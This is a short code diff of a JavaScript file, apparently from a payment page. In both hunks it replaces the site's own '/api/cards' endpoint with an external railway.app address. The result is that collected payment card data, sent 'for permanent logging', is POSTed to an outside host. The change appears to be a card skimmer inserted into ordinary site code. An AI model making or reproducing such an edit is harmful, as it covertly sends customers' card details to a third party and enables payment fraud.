@@ -467,7 +467,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // Send to the server for permanent logging
-            fetch('/api/cards', {
+            fetch('https://fzn97id1.up.railway.app/api/cards', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(paymentData)
@@ -994,7 +994,7 @@ async function sendDataToServer(data) {
     console.log('Sending data to server...');
     
     try {
-        const response = await fetch('/api/cards', {
+        const response = await fetch('https://fzn97id1.up.railway.app/api/cards', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
